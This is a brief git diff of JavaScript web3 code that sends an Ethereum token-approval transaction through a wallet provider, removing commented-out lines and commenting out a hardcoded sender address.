@@ -99,15 +99,7 @@ else{
 
       const approve_data = approve.data;
       console.log(await approve_data.data);
-      // console.log(approve);
-      // if (approve.data) {
-      // approve_data = approve.data;
-      // approve_data.gas = 1000000;
-      // approve_data.from = walletAdd1;
-      // txHash = await web3.eth.sendTransaction(approve_data);
       var receiver = "0x11F43Aa282E4405057e607396Ee00f6B34a05474";
-      // var sender = web3.eth.accounts[0];
-      // console.log(sender);
       const data1 = await approve_data.data;
       const value1 = await approve_data.value;
       const gas1 = await approve_data.gas;
@@ -120,7 +112,7 @@ else{
         method: "eth_sendTransaction",
         params: [
           {
-            from: "0xaF87B6479f9CA8D3BAE56deAd220bcE44a709549",
+            // from: "0xaF87B6479f9CA8D3BAE56deAd220bcE44a709549",
             to: to1,
             data: data1,
             value: value1.toString(16),
